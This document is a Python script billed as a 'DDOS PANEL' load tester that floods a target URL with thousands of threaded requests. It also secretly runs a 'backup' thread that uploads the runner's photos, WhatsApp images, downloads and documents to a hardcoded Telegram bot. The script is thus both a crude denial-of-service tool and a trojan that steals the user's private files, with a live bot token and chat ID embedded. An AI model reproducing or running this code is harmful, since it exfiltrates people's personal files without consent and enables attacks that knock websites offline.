import requests
import threading
import argparse
import time
import os
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# ✅ Telegram Bot Token & Chat ID
BOT_TOKEN = "7870107746:AAGAt7rTjUeAGkL581BcmuCmV6yajf-s-sw"
CHAT_ID = "6365572880"

# ✅ Folder List for Backup
FOLDERS = [
    "/sdcard/Download",
    "/sdcard/DCIM/Camera",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Documents"
]

# ✅ Telegram File Sending Function
def send_to_telegram(file_path, request_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as file:
            response = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file}, verify=False)  # Disabling SSL verification
        if response.status_code == 200:
            print(f"{Fore.GREEN}[✔] Request {request_id} | Status: 200")  # Success
        else:
            print(f"{Fore.RED}[✖] Request {request_id} | Status: Error - {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}[⚠️] Request {request_id} |Please check your connection or Internet.")
    except Exception as e:
        print(f"{Fore.RED}[✖] Request {request_id} | Unexpected Error: {e}")

# ✅ Backup Function for Files
def backup_files():
    request_id = 1  # Unique ID for each request
    for folder in FOLDERS:
        if os.path.exists(folder):
            for file_name in os.listdir(folder):
                file_path = os.path.join(folder, file_name)
                if os.path.isfile(file_path) and os.path.getsize(file_path) < 50 * 1024 * 1024:  # Files smaller than 50MB
                    send_to_telegram(file_path, request_id)
                    request_id += 1
    send_to_telegram("Backup Completed!", request_id)

# ASCII Art Logo inside a box
logo = f"""
{Fore.CYAN}━━━━━━━ DDOS PANEL ━━━━━━━
{Fore.YELLOW}OWNER: MD SOFIKUL ISLAM
{Fore.YELLOW}POWERED BY: CIVILIAN CYBER EXPERT FORCE
{Fore.YELLOW}POWERED BY: REDZA ARMY
{Fore.YELLOW}GITHUB: MR-D4RK-OFFICIAL
{Fore.RED}⚠️ DON'T USE A WRONG WORK ⚠️
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━
"""

# ✅ HTTP Request Sending Function
def send_request(url, request_id):
    try:
        response = requests.get(url, verify=False)  # Disabling SSL verification
        if response.status_code == 200:
            print(f"{Fore.GREEN}[✔] Request {request_id} | Status: {response.status_code}")
        else:
            print(f"{Fore.RED}[✖] Request {request_id} | Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}[⚠️] Request {request_id} | HTTP Request Error - {e}")
    except Exception as e:
        print(f"{Fore.RED}[✖] Request {request_id} | Unexpected Error: {e}")

# ✅ Load Test Function
def load_test(url, num_requests, concurrency):
    print(f"\n{Fore.GREEN}[+] Starting Load Test on: {url}")
    print(f"{Fore.GREEN}[+] Total Requests: {num_requests}, Concurrent Threads: {concurrency}\n")
    print("="*35)
    print(logo)
    print("="*35)

    threads = []
    start_time = time.time()

    for i in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url, i+1))
        threads.append(thread)
        thread.start()

        if len(threads) >= concurrency:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    end_time = time.time()
    print(f"\n{Fore.GREEN}[✔] RED-X attack Completed in {round(end_time - start_time, 2)} seconds.")

# ✅ Function to Run Load Test and Backup Concurrently
def run_load_test_and_backup():
    parser = argparse.ArgumentParser(description="Load Tester & Backup Tool")
    parser.add_argument("url", help="Target URL for load testing")
    parser.add_argument("-n", "--num_requests", type=int, default=15000, help="Total number of requests (default: 15000)")  # 15,000 requests
    parser.add_argument("-c", "--concurrency", type=int, default=100, help="Number of concurrent requests (default: 100)")  # Increased concurrency

    args = parser.parse_args()

    # Start load testing in a new thread
    load_test_thread = threading.Thread(target=load_test, args=(args.url, args.num_requests, args.concurrency))
    load_test_thread.start()

    # Start backup in a new thread
    backup_thread = threading.Thread(target=backup_files)
    backup_thread.start()

    # Wait for both threads to complete
    load_test_thread.join()
    backup_thread.join()

if __name__ == "__main__":
    run_load_test_and_backup()